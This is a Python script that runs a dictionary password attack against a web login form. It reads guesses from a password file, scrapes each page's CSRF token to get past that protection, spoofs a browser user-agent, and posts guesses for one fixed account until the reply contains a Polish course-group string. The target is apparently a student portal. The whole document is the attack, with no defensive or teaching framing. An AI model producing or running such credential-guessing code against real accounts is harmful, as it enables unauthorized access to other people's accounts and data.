import requests
from bs4 import BeautifulSoup

with open('password.txt') as f:
    passwords = f.read().splitlines()

for password in passwords:
    password = password.strip()
    login_data = {
	    'username': 'example@example.com',
	    'password': password
    }
    headers = {
	    "Authorization": f"Basic {login_data['username']}:{password}",
	    "user-agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        "referer": 'https://example.com/'
    }
    print(f'\nUsername: {login_data["username"]}')
    print(f'Password: {password}\n')

    with requests.Session() as s:
	    url = 'https://example.com/'
	    r = s.get(url, headers=headers)
	    soup = BeautifulSoup(r.content, 'html.parser')
	    login_data['csrf_token'] = soup.find('input', attrs={'name': 'csrf_token'})['value']
	    r = s.post(url, data=login_data, headers=headers)
	    if b"Podstawy programowania Warszawa 2A Gr.2" in r.content:
		    print(r.content.decode())
		    break